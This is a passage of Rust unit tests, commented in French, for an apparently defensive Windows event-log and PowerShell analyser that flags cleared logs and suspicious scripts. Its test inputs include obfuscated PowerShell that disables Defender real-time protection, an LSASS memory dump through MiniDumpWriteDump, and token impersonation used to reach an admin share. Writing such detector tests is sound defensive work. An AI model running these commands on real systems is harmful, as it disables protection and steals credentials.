    let mut evs = premier_compte(600, "S-1-5-18");
    evs.push(sec(
        4624,
        -10 * 86_400,
        &[("LogonType", "5"), ("TargetUserName", "SYSTEM")],
    ));
    assert!(!admis(&evs, o()));
    // Un journal de sécurité vidé (1102) : ce qui précédait a pu partir avec lui.
    let mut evs = premier_compte(600, "S-1-5-18");
    evs.push(ev(
        "Security",
        "Microsoft-Windows-Eventlog",
        1102,
        60,
        &[("SubjectUserName", "x")],
    ));
    assert!(!admis(&evs, o()));
}

#[test]
fn un_compte_cree_par_system_hors_de_la_mise_en_route_reste_sans_ajout() {
    // Déjà une information (un outil d'administration crée des comptes) : ni date d'installation ni réserve ajoutées.
    let cree = premier_compte(30 * 86_400, "S-1-5-18").remove(0);
    let t = adm(std::slice::from_ref(&cree), Some(t0()));
    assert_eq!(t[0].gravite, Gravite::Info);
    assert!(
        t[0].details
            .iter()
            .all(|(l, _)| *l != super::moteur::Libelle::Installation)
    );
    let t = adm(&[cree], None);
    assert!(t[0].reserves.is_empty());
}

#[test]
fn reglages_de_defender_employes_autrement() {
    let coupe = [
        "Set-ItemProperty $k DisableRealtimeMonitoring 1",
        "Set-ItemProperty -Path $k -Name (\"Disable\"+\"RealtimeMonitoring\") -Value 1",
        "$a=@{Path=$k;Name='DisableRealtimeMonitoring';Value=1}; Set-ItemProperty @a",
        "$h=@{}; $h['DisableRealtimeMonitoring'] = $true; Set-MpPreference @h",
        "$h.Add('DisableIOAVProtection', $true)",
    ];
    for texte in coupe {
        assert_eq!(script_suspect(texte).map(|x| x.0), Some("desarme"), "{texte}");
    }
}

#[test]
fn le_regroupement_des_avertissements_ne_se_tait_pas() {
    let js = juger(&[bloc_ps(0, "Add-Type -TypeDefinition $c", "", 3)]);
    let t = &trouvailles(&js, "EVT-PSH-001")[0];
    assert_eq!(t.objet, "avertissement|sans-fichier");
    assert!(!resultat::taisable("EVT-PSH-001", t));
    let (constats, _) = resultat::constats(&analyse(js), &|_| true);
    assert!(
        constats
            .iter()
            .any(|c| c.regle == "EVT-PSH-001" && c.probleme.is_some())
    );
}

#[test]
fn vidage_et_usurpation_sans_le_geste_complet() {
    let cas = [
        (
            "$p=Get-Process -Id 624; [W]::MiniDumpWriteDump($p.Handle,$p.Id,$f.SafeFileHandle,2,0,0,0)",
            Some("lsass"),
        ),
        (
            "[W]::LogonUser($u,$d,$m,9,0,[ref]$t); [W]::ImpersonateLoggedOnUser($t); Get-ChildItem \\\\srv\\c$; [W]::RevertToSelf()",
            Some("jeton"),
        ),
    ];
    for (texte, attendu) in cas {
        assert_eq!(script_suspect(texte).map(|x| x.0), attendu, "{texte}");
    }
}
